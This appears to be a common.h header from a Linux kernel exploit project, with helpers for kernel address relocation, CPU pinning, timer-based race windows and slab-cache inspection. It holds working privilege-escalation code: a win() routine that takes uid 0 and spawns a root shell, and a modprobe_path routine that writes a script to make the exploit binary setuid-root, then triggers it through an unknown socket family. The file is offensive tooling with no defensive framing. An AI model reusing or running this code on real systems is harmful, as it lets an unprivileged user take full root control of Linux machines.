#ifndef _COMMON_H
#define _COMMON_H

#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <sched.h>
#include <errno.h>
#include <sys/timerfd.h>
#include <sys/resource.h>

typedef uint64_t u64;
typedef uint32_t u32;
typedef uint16_t u16;
typedef uint8_t  u8;
typedef int64_t  i64;
typedef int32_t  i32;
typedef int16_t  i16;
typedef int8_t   i8;


u64 kernel_base = 0xffffffff81000000;
#define KADDR(addr) ((u64)(addr) - 0xffffffff81000000 + kernel_base)


static void fatal (const char* msg) {
    perror(msg);
    exit(-1);
}

/* Assert that x is true. */
#define CHK(x) do { if (!(x)) { \
    fprintf(stderr, "%s\n", "CHK(" #x ")"); \
    exit(1); } } while (0)

/* Assert that a syscall x has succeeded. */
#define SYSCHK(x) ({ \
    typeof(x) __res = (x); \
    if (__res == (typeof(x))-1) { \
        fprintf(stderr, "%s: %s\n", "SYSCHK(" #x ")", strerror(errno)); \
        exit(1); \
    } \
    __res; \
})


static void x64dump(void *buf, u32 num) {
    u64 *buf64 = (u64*)buf;
    printf("[--dump--] start\n");
    for (u32 i = 0; i < num; i++) {
        if (i%2 == 0) {
            printf("%p: ", &buf64[i]);
        }
        printf("0x%016lx    ",buf64[i]);
        if (i%2 == 1 && i+1 != num) {
            printf("\n");
        }
    }
    printf("\n[--dump--] end\n");
}


static void win() {
    setuid(0);
    setgid(0);
    if (getuid() != 0) {
        puts("[-] not root");
        exit(-1);
    }
    puts("[+] win!");
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    execve("/bin/sh", argv, envp);
    fatal("execve");
}

char exe_path[0x100];
static void setup_modprobe(const char *filepath) {
    int fd;

    if (getenv("modprobe") != NULL)
        win();

    // Get exploit file path
    SYSCHK(readlink("/proc/self/exe", exe_path, sizeof(exe_path)));

    // Create modprobe target
    fd = SYSCHK(open(filepath, O_CREAT|O_WRONLY, 0777));
    dprintf(fd, "#!/bin/sh\nchown +0:+0 '%1$s' || chown root:root '%1$s'\nchmod u+s '%1$s'\n", exe_path);
    close(fd);
}

static void execute_modprobe() {
    // Trigger usermode helper
    socket(22, SOCK_DGRAM, 0);

    char *argv[] = { exe_path, NULL };
    char *envp[] = { "modprobe=1", NULL };
    execve(exe_path, argv, envp);
    fatal("execve");
}


static void print_slab_state (char *caches[]) {
    char line[0x1000];
    static FILE *slabinfo = NULL;

    if (slabinfo == NULL) {
        slabinfo = fopen("/proc/slabinfo", "r");
        if (slabinfo == NULL) return;
    } else {
        fseek(slabinfo, SEEK_SET, 0);
    }

    while (fgets(line, sizeof(line), slabinfo)) {
        char do_print = 0;
        if (strncmp(line, "# name", 6) == 0)
            do_print = 1;
        for (char **name = &caches[0]; *name; name++) {
            if (strncmp(line, *name, strlen(*name)) == 0) {
                do_print = 1;
                break;
            }
        }
        if (do_print) {
            printf("%s", line);
        }
    }
}


static void pin_cpu(int core_id) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core_id, &cpuset);
    if (sched_setaffinity(getpid(), sizeof(cpu_set_t), &cpuset) != 0)
        fatal("pin_cpu");
}

static inline u64 rdtsc() {
    unsigned int lo, hi;
    __asm__ __volatile__ (
        "rdtsc" : "=a" (lo), "=d" (hi)
    );
    return ((u64)hi << 32) | lo;
}

static void set_priority(pid_t pid, int prio) {
    SYSCHK(setpriority(PRIO_PROCESS, pid, prio));
}

static void set_scheduler(pid_t pid, int policy, int prio) {
    struct sched_param param = {
        .sched_priority = policy == SCHED_IDLE ? 0 : prio,
    };
    SYSCHK(sched_setscheduler(pid, policy, &param));
}

static u64 timediff(const struct timespec *ts0, const struct timespec *ts1) {
    return (ts1->tv_sec - ts0->tv_sec) * 1000000000ULL + (ts1->tv_nsec - ts0->tv_nsec);
}

static void burn_cpu_time(u64 delay) {
    struct timespec start, ts;
    SYSCHK(clock_gettime(CLOCK_THREAD_CPUTIME_ID, &start));
    do {
        SYSCHK(clock_gettime(CLOCK_THREAD_CPUTIME_ID, &ts));
    } while (timediff(&start, &ts) < delay);
}

static int tmr_create(void) {
    return SYSCHK(timerfd_create(CLOCK_MONOTONIC, 0));
}

static void tmr_arm(int tmfd, u64 delay) {
    struct itimerspec its = {
        .it_value = {
            .tv_sec = 0,
            .tv_nsec = delay,
        },
        .it_interval = {
            .tv_sec = 0,
            .tv_nsec = 0,
        }
    };
    SYSCHK(timerfd_settime(tmfd, 0, &its, NULL));
}

static void tmr_wait(int tmfd) {
    uint64_t value;
    CHK(read(tmfd, &value, sizeof(value)) == sizeof(value));
}


#endif /* _COMMON_H */
